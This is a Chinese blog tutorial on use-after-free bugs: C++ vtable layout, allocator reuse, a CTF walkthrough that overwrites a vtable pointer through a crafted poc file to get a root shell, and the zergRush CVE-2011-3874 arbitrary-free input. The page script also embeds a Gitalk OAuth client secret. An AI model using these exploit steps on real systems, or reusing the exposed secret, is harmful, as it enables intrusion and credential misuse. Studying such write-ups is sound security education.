<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
<title>
    Rain
</title>
<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
<meta name="author" content="Rainer">
<meta name="description" content="hi&lt;(＃￣▽￣＃)&gt;">
<meta name="keywords" content="">
<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
<link rel="stylesheet" href="https://rainerhu.github.io/styles/main.css" />
<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
    
            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
            
                        <!--CDN样式-->
                        <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
                        
                            <script>
                                (function() {
                                    var bp = document.createElement('script');
                                    var curProtocol = window.location.protocol.split(':')[0];
                                    if (curProtocol === 'https') {
                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
                                    } else {
                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
                                    }
                                    var s = document.getElementsByTagName("script")[0];
                                    s.parentNode.insertBefore(bp, s);
                                })();
                            </script>
                            
                                <script async src="https://www.googletagmanager.com/gtag/js?id=G-9DZS1ZZFGF"></script>
                                <script>
                                    window.dataLayer = window.dataLayer || [];

                                    function gtag() {
                                        dataLayer.push(arguments);
                                    }
                                    gtag('js', new Date());
                                    gtag('config', 'G-9DZS1ZZFGF');
                                </script>
                                
</head>

<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo">
                <a href="https://rainerhu.github.io">
                    Rain
                </a>
            </div>

            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/">
                        首页
                    </a>
                    
                    <a class="menu-item" href="/archives">
                        归档
                    </a>
                    
                    <a class="menu-item" href="/tags">
                        标签
                    </a>
                    
                    <a class="menu-item" href="/post/about">
                        关于
                    </a>
                    
                        <input id="switch_default" type="checkbox" class="switch_default">
                        <label for="switch_default" class="toggleBtn"></label>
            </div>
            <form id="gridea-search-form" data-update="1687779481197" action="/search/index.html">
                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
            </form>
        </div>
    </nav>

    
        <nav class="navbar-mobile" id="nav-mobile">
            <div class="container">
                <div class="navbar-header">
                    <div>
                        <a href="https://rainerhu.github.io">
                            Rain
                        </a>
                        <!--en-->
                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
                        <!--zh-->
                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
                    </div>
                    <form id="gridea-search-form" data-update="1687779481197" action="/search/index.html">
                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
                    </form>
                    <!--en-->
                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
                    <!--zh-->
                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>

                </div>
                <div class="menu" id="mobile-menu">
                    
                        <a class="menu-item" href="/">
                            首页
                        </a>
                        
                        <a class="menu-item" href="/archives">
                            归档
                        </a>
                        
                        <a class="menu-item" href="/tags">
                            标签
                        </a>
                        
                        <a class="menu-item" href="/post/about">
                            关于
                        </a>
                        
                </div>
            </div>
        </nav>
</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementById("menu-toggle-en");
        var toggleMenu_zh = document.getElementById("menu-toggle-zh");

        var mobileMenu = document.getElementById("mobile-menu");
        if (toggleMenu.display != "none") {
            if (toggleMenu.classList.contains("active")) {
                toggleMenu.classList.remove("active")
                mobileMenu.classList.remove("active")
            } else {
                toggleMenu.classList.add("active")
                mobileMenu.classList.add("active")
            }
        } else if (toggleMenu_zh.display != "none") {
            if (toggleMenu_zh.classList.contains("active")) {
                toggleMenu_zh.classList.remove("active")
                mobileMenu.classList.remove("active")
            } else {
                toggleMenu_zh.classList.add("active")
                mobileMenu.classList.add("active")
            }
        }

    }
</script>
            <div class="main">
                <div class="container">
                    <article class="post-wrap">
                        <header class="post-header">
                            <h1 class="post-title">
                                UAF
                            </h1>
                            
                                    <!--zh-->
                                    <div class="post-meta zh">
                                        &#x4F5C;&#x8005;:
                                        <a itemprop="author" rel="author" href="/">
                                            Rain
                                        </a>
                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2020-06-24</a></span>
                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
                                    href="#">11.7
                                    &#x5206;&#x949F;</a></span>
                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">2428</a></span>
                                        
                                            <span class="post-category">&#x5206;&#x7C7B;:
                                
                                <a href="https://rainerhu.github.io/tag/G_Kd9Yy3zU/">Security</a>
                                
                            </span>
                                            
                                                阅读量:
                                                <span data-hk-page="current"> - </span>
                                                
                                    </div>
                                    
                        </header>
                        
                        <div class="post-content">
                            <h3 id="简介">简介</h3>
<p>use after free，即释放后重用。漏洞产生的原因，在于内存在被释放后，但是指向指针并没有被删除，又被程序调用。比较常见的类型是C++对象，利用UAF修改C++的虚函数表导致的任意代码执行。</p>
<h3 id="虚函数">虚函数</h3>
<p>在C++中，如果类中有虚函数，那么它就会有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据，虚函数指针指向虚函数表</p>
<p>对于子类，最开始的内存数据记录着父类对象的拷贝（包括父类虚函数表指针和成员变量）。 之后是子类自己的成员变量数据</p>
<pre><code class="language-c">#include &lt;iostream&gt;
class A{
public:
    int a;
    A():a(0x1) {}
    virtual void foo(){ std::cout &lt;&lt; &quot;A::foo()&quot; &lt;&lt; std::endl; }
    void bar(){ std::cout &lt;&lt; &quot;A::bar()&quot; &lt;&lt; std::endl; }
};
class B: public A{
public:
    int b;
    B():A(),b(0x2) {}
    void foo(){ std::cout &lt;&lt; &quot;B::foo()&quot; &lt;&lt; std::endl; }
};
class C: public B{
public:
    int c;
    C():B(),c(0x3) {}
    void foo(){ std::cout &lt;&lt; &quot;C::foo()&quot; &lt;&lt; std::endl; }
};
int main() {
    A a; B b; C c; B *p = &amp;c;
    p-&gt;foo();
    std::cout &lt;&lt; sizeof(int) &lt;&lt; &quot; &quot; &lt;&lt; sizeof(int*) &lt;&lt; std::endl;
    return 0;
}
</code></pre>
<pre><code>(gdb) p a
$1 = {_vptr.A = 0x555555557d90 &lt;vtable for A+16&gt;, a = 1}
(gdb) p b
$2 = {&lt;A&gt; = {_vptr.A = 0x555555557d78 &lt;vtable for B+16&gt;, a = 1}, b = 2}
(gdb) p c
$3 = {&lt;B&gt; = {&lt;A&gt; = {_vptr.A = 0x555555557d60 &lt;vtable for C+16&gt;, a = 1},
    b = 2}, c = 3}

</code></pre>
<h3 id="slab-slub">SLAB &amp;&amp; SLUB</h3>
<p>内存管理机制，SLAB要求系统暂时保留已经释放的内核对象空间，以便下次申请时不需要再次初始化和分配;但是，SLAB机制对内核对象的类型十分挑剔，只有类型和大小都完全一致的对象才能重用其空间;这就好比是装过鸡的笼子是不允许再去关兔子了,哪怕鸡和兔子的大小一样;<br>
但是,和SLAB相比,SLUB对对象类型就没有限制,两个对象只要大小差不多就可以重用同一块内存,而不在乎类型是否相同;</p>
<p>示例代码</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
int main()
{
    char *p1;
    p1 = (char *) malloc(sizeof(char)*10);
    memcpy(p1,&quot;hello&quot;,10);
    printf(&quot;p1 addr:%x,%s\n&quot;,p1,p1);
    free(p1);
    char *p2;
    p2 = (char *)malloc(sizeof(char)*10); //申请同样大小的内存
    memcpy(p1,&quot;world&quot;,10); //向p1中拷贝 
    printf(&quot;p2 addr:%x,%s\n&quot;,p2,p2);// 输出p2
    return 0;
}
</code></pre>
<p>输出</p>
<pre><code>p1 addr:d21260,hello
p2 addr:d21260,world

</code></pre>
<h3 id="ctf-示例">CTF-示例</h3>
<pre><code class="language-c">#include &lt;fcntl.h&gt;
#include &lt;iostream&gt;
#include &lt;cstring&gt;
#include &lt;cstdlib&gt;
#include &lt;unistd.h&gt;
using namespace std;

class Human{
private:
	virtual void give_shell(){
		 system(&quot;/bin/sh&quot;);
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl;
		cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl;
	}
};
class Man: public Human{
public:
        Man(string name, int age){
                this-&gt;name = name;
                this-&gt;age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this-&gt;name = name;
                this-&gt;age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl;
        }
};

int main(int argc, char* argv[]){
        Human* m = new Man(&quot;Jack&quot;, 25);
        Human* w = new Woman(&quot;Jill&quot;, 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;
                cin &gt;&gt; op;

                switch(op){
                        case 1:
                                m-&gt;introduce();
                                w-&gt;introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                                break;
                }
        }

        return 0;
}
</code></pre>
<p>有三个类，Man和Woman都是继承了Human类，并且可以看出只要我们将控制流劫持到Human类的私有虚函数give_shell，就能getshell了。</p>
<p>可以根据代码看出来，要想利用UAF，就要先选free，然后after，再use。</p>
<p>我们首先要看下要申请多大的内存空间合适，可以把这个代码编译一下，之后用IDA反汇编看下伪代码,可以看到需要0x30，就是48的内存。这个结果会因编译的时候使用的系统不同存在差异，这个CTF题原本给的编译出来的程序反汇编就是0x18的，是24</p>
<pre><code class="language-c++">  v3 = (Man *)operator new(0x30uLL);
  Man::Man(v3, &amp;p_name, 25);
  m = v3;
</code></pre>
<p>也可以用gdb调试看到大小是48</p>
<pre><code class="language-shell">Breakpoint 1, main (argc=1, argv=0x7fffffffe688) at uaf.cpp:54
54                      cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;
(gdb) p *m
$1 = {_vptr.Human = 0x403d80 &lt;vtable for Man+16&gt;, age = 25, name = &quot;Jack&quot;}
(gdb) p sizeof(*m)
$2 = 48

</code></pre>
<p>然后找到introduce调用的地方，可以看到是根据虚函数指针，然后+1调用到的，所以我们要是想调用到given_shell 就是要覆盖改写虚函数指针的值</p>
<pre><code>          (*((void (__fastcall **)(Human *))m-&gt;_vptr_Human + 1))(m);
          (*((void (__fastcall **)(Human *))w-&gt;_vptr_Human + 1))(w);
</code></pre>
<p>然后寻找man 虚函数表。找到man的构造函数</p>
<pre><code class="language-c++">void __cdecl Man::Man(Man *const this, std::string *p_name, int age)
{
  Human::Human(this);
  this-&gt;_vptr_Human = (int (**)(...))&amp;off_403D80;
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator=(&amp;this-&gt;name, p_name);
  this-&gt;age = age;
}
</code></pre>
<p>跟进_vptr_Human的off_403D80处，可以看到man的虚函数表</p>
<pre><code class="language-c++">.data.rel.ro:0000000000403D70 ; `vtable for'Man
.data.rel.ro:0000000000403D70 _ZTV3Man        dq 0                    ; offset to this
.data.rel.ro:0000000000403D78                 dq offset _ZTI3Man      ; `typeinfo for'Man
.data.rel.ro:0000000000403D80 off_403D80      dq offset _ZN5Human10give_shellEv
.data.rel.ro:0000000000403D80                                         ; DATA XREF: Man::Man(std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;,int)+20↑o
.data.rel.ro:0000000000403D80                                         ; Human::give_shell(void)
.data.rel.ro:0000000000403D88                 dq offset _ZN3Man9introduceEv ; Man::introduce(void)
.data.rel.ro:0000000000403D90                 public _ZTV5Human ; weak
.data.rel.ro:0000000000403D90 ; `vtable for'Human
.data.rel.ro:0000000000403D90 _ZTV5Human      dq 0                    ; offset to this
.data.rel.ro:0000000000403D98                 dq offset _ZTI5Human    ; `typeinfo for'Human
.data.rel.ro:0000000000403DA0 off_403DA0      dq offset _ZN5Human10give_shellEv
.data.rel.ro:0000000000403DA0                                         ; DATA XREF: Human::Human(void)+C↑o
.data.rel.ro:0000000000403DA0                                         ; Human::~Human()+C↑o
.data.rel.ro:0000000000403DA0                                         ; Human::give_shell(void)
.data.rel.ro:0000000000403DA8                 dq offset _ZN5Human9introduceEv ; Human::introduce(void)
.data.rel.ro:0000000000403DB0 ; public Woman :
</code></pre>
<p>可以看到，虚函数表中<strong>0x0000000000403D80</strong>地址就是man虚函数指针的值，而m-&gt;introduce()调用时，调用的其实是<code>0x0000000000403D80+0x8=0000000000403D88</code> ，<code>_vptr_Human</code>上加了0x8调用到了introduce。我们想要让他调用到give_shell就只需要将<code>_vptr_Human</code>的值覆盖为<code>0x0000000000403D80-0x8=0x0000000000403D78</code></p>
<p>这个值也可以通过gdb调试看到，打断点之后<code>info vtbl *m</code>就能看到对用的虚函数的表，或者直接查看变量结构也可以看到，我们还可以根据m的指针值，看下man的内存，可以看到第一块放的就是虚函数的指针<code>0x00403d80</code></p>
<pre><code class="language-shell">Starting program: /home/kali/uaf/uaf
\
Breakpoint 1, main (argc=1, argv=0x7fffffffe688) at uaf.cpp:54
54                      cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;
(gdb) p *m
$1 = {_vptr.Human = 0x403d80 &lt;vtable for Man+16&gt;, age = 25, name = &quot;Jack&quot;}
(gdb) info vtbl *m
vtable for 'Human' @ 0x403d80 (subobject @ 0x416eb0):
[0]: 0x40157e &lt;Human::give_shell()&gt;
[1]: 0x401700 &lt;Man::introduce()&gt;
(gdb) x /10 0x403d80
0x403d80 &lt;_ZTV3Man+16&gt;: 0x000000000040157e      0x0000000000401700
0x403d90 &lt;_ZTV5Human&gt;:  0x0000000000000000      0x0000000000403de0
0x403da0 &lt;_ZTV5Human+16&gt;:       0x000000000040157e      0x000000000040159a
0x403db0 &lt;_ZTI5Woman&gt;:  0x00007ffff7fa6c98      0x0000000000402087
0x403dc0 &lt;_ZTI5Woman+16&gt;:       0x0000000000403de0      0x00007ffff7fa6c98
(gdb) p m
$3 = (Human *) 0x416eb0
(gdb) x /10x 0x416eb0
0x416eb0:       0x00403d80      0x00000000      0x00000019      0x00000000
0x416ec0:       0x00416ed0      0x00000000      0x00000004      0x00000000
0x416ed0:       0x6b63614a      0x00000000
</code></pre>
<p>现在我们已经确认了</p>
<ol>
<li>
<p>需要48的空间</p>
</li>
<li>
<p>需要把<code>_vptr_Human</code> 的值覆盖为<code>0x0000000000403D78</code></p>
</li>
</ol>
<p>然后尝试一下</p>
<pre><code class="language-shell">root@kali:/home/kali/uaf# python -c &quot;print('\x78\x3d\x40\x00\x00\x00\x00\x00')&quot; &gt; poc
root@kali:/home/kali/uaf# ./uaf 48 poc
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>注意事项：复现的时候自己编译要注意关掉PIE,不然地址会被随机化处理，只有低两位固定</p>
<p><code>g++ uaf.cpp -o uaf -g -no-pie</code></p>
<h3 id="cve-2011-3874-zergrush">CVE-2011-3874-zergRush</h3>
<p>安卓UAF漏洞，通过缓冲区溢出，控制free任意地址</p>
<p>代码整个流程就是从data中读取数据放入tmp中，以空格为分割，然后，调用<code>strdup</code>申请内存复制tmp中内容，将指针放入argv数组中，然后再对argv中每个指针进行free操作。</p>
<pre><code class="language-c++">void FrameworkListener::dispatchCommand(SocketClient *cli, char *data) {      
    FrameworkCommandCollection::iterator i;                                   
    int argc = 0;                                                             
    char *argv[FrameworkListener::CMD_ARGS_MAX];                              
    char tmp[255];                                                            
    char *p = data;                                                           
    char *q = tmp;                                                            
    bool esc = false;                                                         
    bool quote = false;                                                       
    int k;                                                                    

    memset(argv, 0, sizeof(argv));                                            
    memset(tmp, 0, sizeof(tmp));                                              
    while(*p) {                                                               
        ...  

        *q = *p++; 
        //参数截取分支                                                          
        if (!quote &amp;&amp; *q == ' ') {                                           
            *q = '\0';                                                       
            argv[argc++] = strdup(tmp);                                      
            memset(tmp, 0, sizeof(tmp));                                     
            q = tmp;                                                         
            continue;                                                        
        }                                                                    
        q++;                                                                 
    }                                                                        

    argv[argc++] = strdup(tmp);                                              
    ....                                                                           
    int j;                                                                   
    for (j = 0; j &lt; argc; j++)                                               
        free(argv[j]);                                                       
    return;
} 
</code></pre>
<p>需要关注一点，字符指针数组argv是存在缓冲区溢出的，长度是16。</p>
<p>构造输入 <code>cmd p1 p2 p3 p4 p5 p6 p7 p8 p9 p10 p11 p12 p13 p14 p15 p16 \x78\x56\x34\x12</code> 可以实现free掉 <code>0x12345678</code>处的内存</p>
<p>利用溢出free任意地址是如何实现的呢，关键就是从argv溢出到tmp</p>
<p>在循环不断存入p15之后，argv已经满了，之后读入p16，会将p16的指针存入tmp[0] - tmp[3]，之后继续读入我们构造的地址</p>
<p>首先，会将地址存入tmp中，会覆盖掉tmp[0] - tmp[3]，也就是将argv[16]存放的指针地址给覆盖掉了，之后再将此块数据申请一块内存，把指针给argv[17],其实也是tmp的tmp[4] - tmp[7]</p>
<p>之后循环free的时候，在free[argv[16]]的时候就会free掉我们写入的特定地址<br>
<img src="https://rainerhu.github.io/post-images/1687092682484.png" alt="" loading="lazy"><br>
之后再次调用这个函数，执行到strdup(tmp)的时候就可以分配一块可控制大小的内存，可以将刚才free掉的内存分配到，然后对这块内存进行写入数据。进行后续的利用</p>
<h3 id="小结">小结</h3>
<ul>
<li>存在有指针在释放后还会被继续使用的逻辑</li>
<li>可以控制free掉任意指针的内存，然后再申请该内存，写入数据</li>
</ul>
<p>两种情况都会导致UAF，第二种会比较少见也更加隐蔽，一般需要其他漏洞才能做到</p>

                        </div>
                        
                            <div class="post-toc">
                                <ul class="markdownIt-TOC">
<li>
<ul>
<li>
<ul>
<li><a href="#%E7%AE%80%E4%BB%8B">简介</a></li>
<li><a href="#%E8%99%9A%E5%87%BD%E6%95%B0">虚函数</a></li>
<li><a href="#slab-slub">SLAB &amp;&amp; SLUB</a></li>
<li><a href="#ctf-%E7%A4%BA%E4%BE%8B">CTF-示例</a></li>
<li><a href="#cve-2011-3874-zergrush">CVE-2011-3874-zergRush</a></li>
<li><a href="#%E5%B0%8F%E7%BB%93">小结</a></li>
</ul>
</li>
</ul>
</li>
</ul>

                            </div>
                            
                                
                                    
                                            <!--zh-->
                                            <section class="post-copyright zh">
                                                <p class="copyright-item ">
                                                    <span>&#x4F5C;&#x8005;:</span>
                                                    <span>Rain</span>
                                                </p>

                                                <p class="copyright-item">
                                                    <span>&#x6C38;&#x4E45;&#x94FE;&#x63A5;:</span>
                                                    <span><a href="https://rainerhu.github.io/post/uaf/">https://rainerhu.github.io/post/uaf/</a></span>
                                                </p>

                                                <p class="copyright-item">
                                                    <span>&#x534F;&#x8BAE;:</span>
                                                    <span>MIT License</span>
                                                </p>
                                            </section>
                                            
                                                
                                                    
                                                                    <!--Share-->
                                                                    <span style="margin-right:15px">
                        <i class="post-share"></i>
                        <span>&#x5206;&#x4EAB;:</span>
                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://rainerhu.github.io/post/uaf/"><i class="fa fa-qrcode"></i></a>
                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://rainerhu.github.io/post/uaf/&sharesource=qzone&title=UAF&pics=https://rainerhu.github.io/images/avatar.png?v=1687779481197&summary="><i class="fa fa-qq"></i></a>
                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://rainerhu.github.io/post/uaf/&sharesource=weibo&title=UAF + " - " + &pic="https://rainerhu.github.io/images/avatar.png?v=1687779481197 "><i class="fa fa-weibo "></i></a>

                                                                    </span>
                                                                    
                                                                            <!--zh-->
                                                                            <section class="post-tags zh ">
                                                                                <div>
                                                                                    <span>&#x6807;&#x7B7E;:</span>
                                                                                    <span class="tag ">
                        
                        
                        <a href="https://rainerhu.github.io/tag/G_Kd9Yy3zU/">#
                    Security
                        </a>
                        
                            
                                </span>
                                                                                </div>
                                                                                <div>
                                                                                    <a href="javascript:window.history.back();">
                        &#x8FD4;&#x56DE;</a>
                                                                                    <span>&dot;</span>
                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
                                                                                </div>
                                                                            </section>

                                                                            
                                                                                <!---->
                                                                                <section class="post-nav">
                                                                                    
                                                                                        <a class="prev" rel="prev" href="https://rainerhu.github.io/post/python-pickle/">
                                                                                            python pickle
                                                                                        </a>
                                                                                        
                                                                                            
                                                                                                <a class="next" rel="next" href="https://rainerhu.github.io/post/ming-ling-ji-lu/">
                                                                                                    命令记录
                                                                                                </a>
                                                                                                
                                                                                </section>
                 <br>
                
                    
                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>

<script>
    var gitalk = new Gitalk({
        clientID: '69c3f7f6bd9f878c4618',
        clientSecret: '2685804d68000de33acf70353e4540306ea18492',
        repo: 'Rainerhu.github.io',
        owner: 'Rainerhu',
        admin: ['Rainerhu'],
        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
        distractionFreeMode: false // Facebook-like distraction free mode
    })

    gitalk.render('gitalk-container')
</script>
                            
                                        
                                            
					</article>
                </div>
            </div>
    </div>
    </div>
    </div>
    
        <footer id="footer" class="footer">
            <div class="copyright">
                
                        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
                            
                                <b id="hitokoto"></b><br>
                                
                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
            <path
                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
                fill="#93b5cf"></path>
        </svg>
                                        Rain &copy;Copyright
                                            <script>
                                                var date = new Date();
                                                document.write("" + date.getFullYear());
                                            </script>
                                            | Powered by
                                            <a href="xx" target="_blank">
                                                git
                                            </a>
            </div>
            <div id="update" style="display:none;">
                off
            </div>
            
                    <script>
                        var pat = '';
                        
                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
                    </script>
        </footer>
        
            <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script>
            
                <script>
                    
                    
                    loadlive2d();
                    
                    
                    hitokoto();
                    
                    getStar();
                    hljs.initHighlighting();
                    console.clear();
                    
                    var newDate = new Date();
                    newDate.setTime(1687779481197);
                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                </script>
                
        </div>
</body>
<script>
    scroll();
</script>

</html>